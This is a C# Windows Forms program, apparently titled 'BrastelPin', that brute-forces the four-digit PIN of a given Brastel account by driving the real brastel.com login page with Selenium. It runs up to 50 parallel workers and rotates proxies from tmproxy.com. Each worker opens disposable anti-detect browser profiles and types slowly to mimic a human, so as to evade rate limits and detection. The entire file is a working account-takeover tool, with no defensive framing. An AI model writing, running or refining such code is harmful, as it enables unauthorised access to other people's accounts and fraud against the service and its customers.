using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Linq;
using System.Collections.Concurrent;

namespace BrastelPin
{
    public partial class MainForm : Form
    {
        // Constants
        private const int MAX_CHECKS_PER_PROFILE = 10;
        private const int ELEMENT_WAIT_MS = 5000;
        private const int TYPING_DELAY_MS = 150;
        private const int BACKSPACE_DELAY_MS = 15;

        private GUIDataModel _gUIDataModel = null;
        private OmniLoginProfileManager _omniLoginProfileManager;
        private ProxyManager _proxyManager;
        private CancellationTokenSource _cancellationTokenSource;

        private Queue<int> _pinQueue = new Queue<int>();
        private object _queueLock = new object();

        public MainForm()
        {
            InitializeComponent();
        }

        private async void btnStart_Click(object sender, EventArgs e)
        {
            rtbLog.Clear();

            AddLog("[INFO] Starting PIN checking process...");

            if (string.IsNullOrEmpty(_gUIDataModel.AccountCode))
            {
                AddLog("[ERROR] Account code is empty. Please check account code.");
                MessageBox.Show("Please check account code");
                return;
            }

            if (_gUIDataModel.PinFrom > _gUIDataModel.PinTo)
            {
                AddLog($"[ERROR] Invalid PIN range: {_gUIDataModel.PinFrom} to {_gUIDataModel.PinTo}");
                MessageBox.Show("Please check PIN range");
                return;
            }

            // Validate concurrent profiles and proxy keys
            if (!_gUIDataModel.ValidateConcurrentProfiles(out string validationError))
            {
                AddLog($"[ERROR] {validationError}");
                MessageBox.Show(validationError);
                return;
            }

            // Initialize PIN queue
            _pinQueue.Clear();
            int totalPins = 0;
            for (int i = _gUIDataModel.PinFrom; i <= _gUIDataModel.PinTo; i++)
            {
                _pinQueue.Enqueue(i);
                totalPins++;
            }

            AddLog($"[INFO] Starting PIN check for account code: {_gUIDataModel.AccountCode}");
            AddLog($"[INFO] PIN range: {_gUIDataModel.PinFrom} to {_gUIDataModel.PinTo} (Total: {totalPins} PINs)");
            AddLog($"[INFO] Number of proxy keys: {_gUIDataModel.TMProxyKeys.Count}");
            AddLog($"[INFO] Concurrent profiles: {_gUIDataModel.ConcurrentProfiles}");

            // Initialize proxy manager
            _proxyManager = new ProxyManager(_gUIDataModel.TMProxyKeys, AddLog);
            _proxyManager.InitializeProxiesAsync();

            // Create cancellation token for stopping
            _cancellationTokenSource = new CancellationTokenSource();

            ToogleControl(false);

            try
            {
                // Start multiple worker threads based on concurrent profiles setting
                var workerTasks = new List<Task>();
                for (int i = 0; i < _gUIDataModel.ConcurrentProfiles; i++)
                {
                    int workerId = i + 1;
                    var task = Task.Run(() => WorkerThread(workerId, _cancellationTokenSource.Token), _cancellationTokenSource.Token);
                    workerTasks.Add(task);
                }

                await Task.WhenAll(workerTasks);
                AddLog("[INFO] Completed checking all PINs.");
            }
            catch (OperationCanceledException)
            {
                AddLog("[INFO] PIN checking process was stopped by user.");
            }
            catch (Exception ex)
            {
                AddLog($"[ERROR] Unexpected error in main process: {ex.Message}");
            }
            finally
            {
                _proxyManager?.Dispose();
                _cancellationTokenSource?.Dispose();
                _cancellationTokenSource = null;
                ToogleControl(true);
            }
        }

        private void ToogleControl(bool enable)
        {
            txtAccountCode.Enabled = enable;
            txtPinFrom.Enabled = enable;
            txtPinTo.Enabled = enable;
            txtTMProxy.Enabled = enable;
            txtOmniloginURL.Enabled = enable;
            txtConcurrentProfiles.Enabled = enable;
            btnDeleteAllProfiles.Enabled = enable;
            btnStart.Enabled = enable;
            btnStop.Enabled = !enable;

            // Reset stop button text when enabling controls
            if (enable)
            {
                btnStop.Text = "Stop";
            }

            AddLog($"[INFO] Controls {(enable ? "enabled" : "disabled")}");
        }

        private async void WorkerThread(int workerId, CancellationToken cancellationToken)
        {
            int countCheck1Profile = 0;
            int totalProcessed = 0;
            ProxyInfo currentProxyInfo = null;
            System.Threading.Timer proxyRotationTimer = null;

            AddLog($"[INFO] Worker thread {workerId} started");

            try
            {
                // Get dedicated API key for this worker
                string dedicatedApiKey = _proxyManager.GetDedicatedApiKey(workerId);
                if (string.IsNullOrEmpty(dedicatedApiKey))
                {
                    AddLog($"[ERROR] Worker {workerId}: No available API key for this worker");
                    return;
                }

                // Get initial proxy for this worker's dedicated API key
                currentProxyInfo = await _proxyManager.GetProxyForDedicatedKeyAsync(dedicatedApiKey);
                if (currentProxyInfo == null)
                {
                    AddLog($"[ERROR] Worker {workerId}: Failed to get initial proxy for dedicated key");
                    return;
                }

                AddLog($"[INFO] Worker {workerId}: Assigned dedicated API key {dedicatedApiKey.Substring(0, Math.Min(10, dedicatedApiKey.Length))}... with proxy {currentProxyInfo.ProxyResponse.data.https}");

                // Setup proxy rotation timer for 150 seconds
                //proxyRotationTimer = new System.Threading.Timer(async (state) =>
                //{
                //    try
                //    {
                //        if (!cancellationToken.IsCancellationRequested)
                //        {
                //            AddLog($"[INFO] Worker {workerId}: Auto-rotating proxy for dedicated key {dedicatedApiKey.Substring(0, Math.Min(10, dedicatedApiKey.Length))}...");
                //            var newProxyInfo = await _proxyManager.GetProxyForDedicatedKeyAsync(dedicatedApiKey);
                //            if (newProxyInfo != null)
                //            {
                //                currentProxyInfo = newProxyInfo;
                //                lastProxyRotation = DateTime.Now;
                //                AddLog($"[INFO] Worker {workerId}: Proxy auto-rotated successfully to {currentProxyInfo.ProxyResponse.data.https}");
                //            }
                //        }
                //    }
                //    catch (Exception ex)
                //    {
                //        AddLog($"[ERROR] Worker {workerId}: Error during auto proxy rotation: {ex.Message}");
                //    }
                //}, null, TimeSpan.FromSeconds(150), TimeSpan.FromSeconds(150));

                while (!cancellationToken.IsCancellationRequested)
                {
                    countCheck1Profile = 0;

                    if ((DateTime.Now - currentProxyInfo.StartTime).TotalSeconds > 150)
                    {
                        try
                        {
                            if (!cancellationToken.IsCancellationRequested)
                            {
                                AddLog($"[INFO] Worker {workerId}: Rotating proxy for dedicated key {dedicatedApiKey.Substring(0, Math.Min(10, dedicatedApiKey.Length))}...");
                                var newProxyInfo = await _proxyManager.GetProxyForDedicatedKeyAsync(dedicatedApiKey);
                                if (newProxyInfo != null)
                                {
                                    currentProxyInfo = newProxyInfo;
                                    AddLog($"[INFO] Worker {workerId}: Proxy rotated successfully to {currentProxyInfo.ProxyResponse.data.https}");
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            AddLog($"[ERROR] Worker {workerId}: Error during proxy rotation: {ex.Message}");
                        }
                    }







                    int pin;
                    lock (_queueLock)
                    {
                        if (_pinQueue.Count == 0)
                        {
                            AddLog($"[INFO] Worker {workerId}: PIN queue is empty, ending worker thread");
                            return;
                        }
                        pin = _pinQueue.Dequeue();
                        AddLog($"[INFO] Worker {workerId}: Remaining PINs in queue: {_pinQueue.Count}");
                    }

                    // Check for cancellation before processing PIN
                    if (cancellationToken.IsCancellationRequested)
                    {
                        AddLog($"[INFO] Worker {workerId}: Cancellation requested, stopping worker thread");
                        return;
                    }

                    string pinStr = pin.ToString("D4");
                    AddLog($"[INFO] Worker {workerId}: Processing PIN: {pinStr}");

                    try
                    {

                        AddLog($"[INFO] Worker {workerId}: Creating new profile with embedded proxy...");
                        string profileId = await _omniLoginProfileManager.CreateProfileAsync($"Worker{workerId}_Profile", null, "win", currentProxyInfo.ProxyResponse);
                        if (string.IsNullOrEmpty(profileId))
                        {
                            AddLog($"[ERROR] Worker {workerId}: Failed to create profile");
                            break;
                        }
                        AddLog($"[INFO] Worker {workerId}: Profile created successfully: {profileId}");

                        AddLog($"[INFO] Worker {workerId}: Starting profile...");
                        int port = await _omniLoginProfileManager.StartProfileAndGetPortAsync(profileId);
                        if (port == 0)
                        {
                            AddLog($"[ERROR] Worker {workerId}: Failed to start profile");
                            await CleanupProfile(workerId, profileId);
                            break;
                        }
                        AddLog($"[INFO] Worker {workerId}: Profile running on port: {port}");

                        using (ChromeDriver driver = _omniLoginProfileManager.GetChromeDriverFromPort(port))
                        {
                            AddLog($"[INFO] Worker {workerId}: Chrome driver initialized with proxy {currentProxyInfo.ProxyResponse.data.https}");
                            AddLog($"[INFO] Worker {workerId}: Navigating to Brastel login page");
                            driver.Navigate().GoToUrl("https://www.brastel.com/eng/myaccount");
                            AddLog($"[INFO] Worker {workerId}: Successfully navigated to login page");

                            try
                            {
                                AddLog($"[INFO] Worker {workerId}: Attempting login with PIN: {pinStr}");

                                // Enter account code
                                AddLog($"[INFO] Worker {workerId}: Locating account code input field");
                                var accCodeInput = driver.FindElement(By.Id("accCodeInput"));

                                // Clear existing text
                                for (int i = 0; i < 10; i++)
                                {
                                    accCodeInput.SendKeys(OpenQA.Selenium.Keys.Backspace);
                                    Thread.Sleep(BACKSPACE_DELAY_MS);
                                }

                                // Enter account code
                                AddLog($"[INFO] Worker {workerId}: Entering account code: {_gUIDataModel.AccountCode}");
                                foreach (char c in _gUIDataModel.AccountCode)
                                {
                                    accCodeInput.SendKeys(c.ToString());
                                    Thread.Sleep(TYPING_DELAY_MS);
                                }

                                // Enter PIN
                                AddLog($"[INFO] Worker {workerId}: Locating PIN input field");
                                var pinInput = driver.FindElement(By.Id("pinInput"));

                            CHECK_PIN:
                                // Clear existing text
                                for (int i = 0; i < 10; i++)
                                {
                                    pinInput.SendKeys(OpenQA.Selenium.Keys.Backspace);
                                    Thread.Sleep(BACKSPACE_DELAY_MS);
                                }

                                // Enter PIN twice (as required by the site)
                                AddLog($"[INFO] Worker {workerId}: Entering PIN: {pinStr}");
                                for (int pinEntry = 0; pinEntry < 2; pinEntry++)
                                {
                                    foreach (char c in pinStr)
                                    {
                                        pinInput.SendKeys(c.ToString());
                                        Thread.Sleep(TYPING_DELAY_MS);
                                    }
                                }

                                // Click sign in button
                                AddLog($"[INFO] Worker {workerId}: Clicking SIGN IN button");
                                var btnSignIn = driver.FindElement(By.XPath("//button[contains(text(), 'SIGN IN')]"));
                                ((IJavaScriptExecutor)driver).ExecuteScript("arguments[0].click();", btnSignIn);

                                AddLog($"[INFO] Worker {workerId}: Waiting for login response...");
                                Thread.Sleep(ELEMENT_WAIT_MS);

                                // Check for error message
                                var findErrorDisplay = driver.FindElement(By.XPath("//span[contains(normalize-space(), 'Invalid User ID or PIN.')]"));
                                if (findErrorDisplay.Displayed)
                                {
                                    totalProcessed++;
                                    Invoke(new Action(() =>
                                    {
                                        AddLog($"[CHECKED] Worker {workerId}: PIN {pinStr} is incorrect (Processed: {totalProcessed})");
                                    }));
                                }
                                else
                                {
                                    totalProcessed++;
                                    Invoke(new Action(() =>
                                    {
                                        AddLog($"[SUCCESS] Worker {workerId}: Login successful with PIN: {pinStr} (Processed: {totalProcessed})");
                                    }));

                                    await CleanupProfile(workerId, profileId);
                                    break;
                                }

                                countCheck1Profile++;
                                AddLog($"[INFO] Worker {workerId}: Profile usage count: {countCheck1Profile}/{MAX_CHECKS_PER_PROFILE}");

                                if (countCheck1Profile < MAX_CHECKS_PER_PROFILE)
                                {
                                    bool isEmptyQueue = false;
                                    lock (_queueLock)
                                    {
                                        if (_pinQueue.Count == 0)
                                        {
                                            isEmptyQueue = true;
                                        }
                                        else
                                        {
                                            pin = _pinQueue.Dequeue();
                                        }
                                    }

                                    if (isEmptyQueue)
                                    {
                                        AddLog($"[INFO] Worker {workerId}: Queue is empty, cleaning up profile");
                                        await CleanupProfile(workerId, profileId);
                                        break;
                                    }
                                    else
                                    {
                                        pinStr = pin.ToString("D4");
                                        AddLog($"[INFO] Worker {workerId}: Reusing profile for next PIN: {pinStr}");
                                        goto CHECK_PIN;
                                    }
                                }
                                else
                                {
                                    AddLog($"[INFO] Worker {workerId}: Maximum profile usage reached, cleaning up");
                                }

                                await CleanupProfile(workerId, profileId);
                            }
                            catch (NoSuchElementException ex)
                            {
                                AddLog($"[ERROR] Worker {workerId}: Element not found: {ex.Message}");
                                await CleanupProfile(workerId, profileId);
                                break;
                            }
                            catch (WebDriverException ex)
                            {
                                AddLog($"[ERROR] Worker {workerId}: WebDriver error: {ex.Message}");
                                await CleanupProfile(workerId, profileId);
                                break;
                            }
                            finally
                            {
                                // Proxy is embedded in profile, no need to return it
                                AddLog($"[INFO] Worker {workerId}: Chrome driver session completed");
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Invoke(new Action(() =>
                        {
                            AddLog($"[ERROR] Worker {workerId}: Unexpected error: {ex.Message}");
                        }));
                    }
                }
            }
            finally
            {
                // Cleanup timer and release API key
                proxyRotationTimer?.Dispose();
                if (!string.IsNullOrEmpty(currentProxyInfo?.ApiKey))
                {
                    _proxyManager.ReleaseDedicatedApiKey(workerId);
                    AddLog($"[INFO] Worker {workerId}: Released dedicated API key and cleaned up resources");
                }
            }
        }

        private async Task CleanupProfile(int workerId, string profileId)
        {
            try
            {
                AddLog($"[INFO] Worker {workerId}: Stopping profile: {profileId}");
                await _omniLoginProfileManager.StopProfileAsync(profileId);

                AddLog($"[INFO] Worker {workerId}: Deleting profile: {profileId}");
                await _omniLoginProfileManager.DeleteProfileAsync(profileId);

                AddLog($"[INFO] Worker {workerId}: Profile cleanup completed: {profileId}");
            }
            catch (Exception ex)
            {
                AddLog($"[ERROR] Worker {workerId}: Failed to cleanup profile {profileId}: {ex.Message}");
            }
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            AddLog("[INFO] Application starting up...");

            _gUIDataModel = GUIDataModel.LoadFromFile();
            AddLog("[INFO] Configuration loaded from file");

            _omniLoginProfileManager = new OmniLoginProfileManager(_gUIDataModel.OmniloginURL, AddLog);
            AddLog($"[INFO] OmniLogin manager initialized with URL: {_gUIDataModel.OmniloginURL}");

            // Load UI values
            txtAccountCode.Text = _gUIDataModel.AccountCode;
            txtPinFrom.Text = _gUIDataModel.PinFrom.ToString();
            txtPinTo.Text = _gUIDataModel.PinTo.ToString();
            txtTMProxy.Text = _gUIDataModel.TMProxy;
            txtOmniloginURL.Text = _gUIDataModel.OmniloginURL;
            txtConcurrentProfiles.Text = _gUIDataModel.ConcurrentProfiles.ToString();

            // Setup event handlers
            txtAccountCode.TextChanged += new EventHandler(TextBoxTextChanged);
            txtPinFrom.TextChanged += new EventHandler(TextBoxTextChanged);
            txtTMProxy.TextChanged += new EventHandler(TextBoxTextChanged);
            txtPinTo.TextChanged += new EventHandler(TextBoxTextChanged);
            txtOmniloginURL.TextChanged += new EventHandler(TextBoxTextChanged);
            txtConcurrentProfiles.TextChanged += new EventHandler(TextBoxTextChanged);

            AddLog("[INFO] Application initialized successfully");
        }

        private void rtbLog_TextChanged(object sender, EventArgs e)
        {
            rtbLog.SelectionStart = rtbLog.Text.Length;
            rtbLog.ScrollToCaret();
        }

        private void TextBoxTextChanged(object sender, EventArgs e)
        {
            try
            {
                _gUIDataModel.AccountCode = txtAccountCode.Text;
                _gUIDataModel.PinFrom = int.Parse(txtPinFrom.Text);
                _gUIDataModel.PinTo = int.Parse(txtPinTo.Text);
                _gUIDataModel.TMProxy = txtTMProxy.Text;
                _gUIDataModel.OmniloginURL = txtOmniloginURL.Text;
                _gUIDataModel.ConcurrentProfiles = int.Parse(txtConcurrentProfiles.Text);
                _gUIDataModel.SaveToFile();

                AddLog("[INFO] Configuration updated and saved");
            }
            catch (Exception ex)
            {
                AddLog($"[ERROR] Failed to save configuration: {ex.Message}");
            }
        }

        private void TextBoxPinKeyPress(object sender, KeyPressEventArgs e)
        {
            if (char.IsControl(e.KeyChar))
            {
                return;
            }

            if (!char.IsDigit(e.KeyChar))
            {
                e.Handled = true;
                return;
            }

            TextBox tb = sender as TextBox;
            string newText = tb.Text.Insert(tb.SelectionStart, e.KeyChar.ToString());

            if (int.TryParse(newText, out int value))
            {
                if (value > 9999)
                {
                    e.Handled = true;
                }
            }
            else
            {
                e.Handled = true;
            }
        }

        private void TextBoxConcurrentProfilesKeyPress(object sender, KeyPressEventArgs e)
        {
            if (char.IsControl(e.KeyChar))
            {
                return;
            }

            if (!char.IsDigit(e.KeyChar))
            {
                e.Handled = true;
                return;
            }

            TextBox tb = sender as TextBox;
            string newText = tb.Text.Insert(tb.SelectionStart, e.KeyChar.ToString());

            if (int.TryParse(newText, out int value))
            {
                if (value > 50) // Maximum 50 concurrent profiles
                {
                    e.Handled = true;
                }
            }
            else
            {
                e.Handled = true;
            }
        }

        private void AddLog(string log)
        {
            rtbLog.Invoke(new Action(() =>
            {
                string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                rtbLog.AppendText($"[{timestamp}] {log}" + Environment.NewLine);
            }));
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            AddLog("[INFO] Stop button clicked - requesting cancellation...");

            if (_cancellationTokenSource != null && !_cancellationTokenSource.Token.IsCancellationRequested)
            {
                _cancellationTokenSource.Cancel();
                AddLog("[INFO] Cancellation request sent to all worker threads");

                // Disable stop button to prevent multiple clicks
                btnStop.Enabled = false;
                btnStop.Text = "Stopping...";

                AddLog("[INFO] Please wait while the current operations complete...");
            }
            else
            {
                AddLog("[INFO] No active process to stop or already stopping");
            }
        }

        private async void btnDeleteAllProfiles_Click(object sender, EventArgs e)
        {
            rtbLog.Clear();
            AddLog("[INFO] Starting to delete all profiles...");

            bool enableControl = false;
            txtAccountCode.Enabled = enableControl;
            txtPinFrom.Enabled = enableControl;
            txtPinTo.Enabled = enableControl;
            txtTMProxy.Enabled = enableControl;
            txtOmniloginURL.Enabled = enableControl;
            txtConcurrentProfiles.Enabled = enableControl;
            btnDeleteAllProfiles.Enabled = enableControl;
            btnStart.Enabled = enableControl;
            btnStop.Enabled = enableControl;

            try
            {
                bool result = await _omniLoginProfileManager.DeleteAllProfilesAsync();
                if (result)
                {
                    AddLog("[INFO] Successfully deleted all profiles");
                }
                else
                {
                    AddLog("[ERROR] Failed to delete all profiles");
                }
            }
            catch (Exception ex)
            {
                AddLog($"[ERROR] Exception while deleting profiles: {ex.Message}");
            }

            enableControl = true;
            txtAccountCode.Enabled = enableControl;
            txtPinFrom.Enabled = enableControl;
            txtPinTo.Enabled = enableControl;
            txtTMProxy.Enabled = enableControl;
            txtOmniloginURL.Enabled = enableControl;
            txtConcurrentProfiles.Enabled = enableControl;
            btnDeleteAllProfiles.Enabled = enableControl;
            btnStart.Enabled = enableControl;
            btnStop.Enabled = enableControl;

            AddLog("[INFO] All controls re-enabled");
        }
    }

    // Proxy Manager class to handle multiple proxy keys with rotation
    public class ProxyManager : IDisposable
    {
        // Constants
        private const int PROXY_RETRY_DELAY_MS = 30000; // 30 seconds retry delay

        private readonly List<string> _proxyKeys;
        private readonly Action<string> _logAction;
        private readonly ConcurrentDictionary<string, ProxyInfo> _proxyPool;
        private readonly ConcurrentDictionary<int, string> _workerApiKeys; // workerId -> apiKey mapping
        private readonly object _lock = new object();
        private bool _disposed = false;
        private int _currentKeyIndex = 0;

        public ProxyManager(List<string> proxyKeys, Action<string> logAction)
        {
            _proxyKeys = proxyKeys ?? throw new ArgumentNullException(nameof(proxyKeys));
            _logAction = logAction ?? throw new ArgumentNullException(nameof(logAction));
            _proxyPool = new ConcurrentDictionary<string, ProxyInfo>();
            _workerApiKeys = new ConcurrentDictionary<int, string>();
        }

        public void InitializeProxiesAsync()
        {
            _logAction("[INFO] Initializing proxy manager...");
            // No need to initialize all proxies upfront since each worker will get its own
            _logAction($"[INFO] Proxy manager initialized with {_proxyKeys.Count} API keys available");
        }

        // Get dedicated API key for a specific worker
        public string GetDedicatedApiKey(int workerId)
        {
            lock (_lock)
            {
                // Check if worker already has an assigned key
                if (_workerApiKeys.TryGetValue(workerId, out string existingKey))
                {
                    return existingKey;
                }

                // Find an available API key (not assigned to any worker)
                var assignedKeys = _workerApiKeys.Values.ToHashSet();
                var availableKey = _proxyKeys.FirstOrDefault(key => !assignedKeys.Contains(key));

                if (availableKey != null)
                {
                    _workerApiKeys.TryAdd(workerId, availableKey);
                    _logAction($"[INFO] Assigned dedicated API key {availableKey.Substring(0, Math.Min(10, availableKey.Length))}... to worker {workerId}");
                    return availableKey;
                }

                _logAction($"[ERROR] No available API key for worker {workerId}. Total keys: {_proxyKeys.Count}, Assigned: {assignedKeys.Count}");
                return null;
            }
        }

        // Release dedicated API key when worker finishes
        public void ReleaseDedicatedApiKey(int workerId)
        {
            if (_workerApiKeys.TryRemove(workerId, out string apiKey))
            {
                // Also remove from proxy pool
                _proxyPool.TryRemove(apiKey, out _);
                _logAction($"[INFO] Released API key {apiKey.Substring(0, Math.Min(10, apiKey.Length))}... from worker {workerId}");
            }
        }

        // Get proxy for a dedicated API key
        public async Task<ProxyInfo> GetProxyForDedicatedKeyAsync(string apiKey)
        {
            ProxyResponse proxyResponse = null;
            int retryCount = 0;

            // Keep trying until we get a proxy or reach max retries
            while (proxyResponse == null)
            {
                try
                {
                    retryCount++;
                    _logAction($"[INFO] Getting proxy for dedicated key {apiKey.Substring(0, Math.Min(10, apiKey.Length))}... (Attempt {retryCount})");

                    proxyResponse = await GetProxyAsync(apiKey);

                    if (proxyResponse != null)
                    {
                        var proxyInfo = new ProxyInfo
                        {
                            ApiKey = apiKey,
                            ProxyResponse = proxyResponse,
                            StartTime = DateTime.Now,
                        };

                        // Update the proxy in pool
                        _proxyPool.AddOrUpdate(apiKey, proxyInfo, (key, oldValue) => proxyInfo);
                        _logAction($"[INFO] Proxy obtained successfully for key {apiKey.Substring(0, Math.Min(10, apiKey.Length))}...: {proxyResponse.data.https}");
                        return proxyInfo;
                    }
                    else
                    {
                        _logAction($"[WARNING] Failed to get proxy for key {apiKey.Substring(0, Math.Min(10, apiKey.Length))}... (Attempt {retryCount}). Retrying in {PROXY_RETRY_DELAY_MS}ms...");
                        await Task.Delay(PROXY_RETRY_DELAY_MS);
                    }
                }
                catch (Exception ex)
                {
                    _logAction($"[ERROR] Exception getting proxy for key {apiKey.Substring(0, Math.Min(10, apiKey.Length))}... (Attempt {retryCount}): {ex.Message}. Retrying in {PROXY_RETRY_DELAY_MS}ms...");
                    await Task.Delay(PROXY_RETRY_DELAY_MS);
                }
            }

            return null; // Should never reach here due to infinite retry loop
        }

        private async Task<ProxyResponse> GetProxyAsync(string apiKey)
        {
            string url = "https://tmproxy.com/api/proxy/get-new-proxy";

            var json =
                $@"{{
                    ""api_key"": ""{apiKey}"",
                    ""id_location"": 0,
                    ""id_isp"": 0
                }}";

            using (HttpClient client = new HttpClient())
            {
                var content = new StringContent(json, Encoding.UTF8, "application/json");

                try
                {
                    HttpResponseMessage response = await client.PostAsync(url, content);
                    string result = await response.Content.ReadAsStringAsync();

                    var proxyResponse = JsonConvert.DeserializeObject<ProxyResponse>(result);

                    if (proxyResponse != null && proxyResponse.code == 0)
                    {
                        return proxyResponse;
                    }
                    else
                    {
                        return null;
                    }
                }
                catch
                {
                    return null;
                }
            }
        }

        public void Dispose()
        {
            if (!_disposed)
            {
                _logAction("[INFO] Disposing proxy manager");
                _proxyPool.Clear();
                _workerApiKeys.Clear();
                _disposed = true;
            }
        }
    }

    public class ProxyInfo
    {
        public string ApiKey { get; set; }
        public ProxyResponse ProxyResponse { get; set; }
        public DateTime StartTime { get; set; }
    }
}
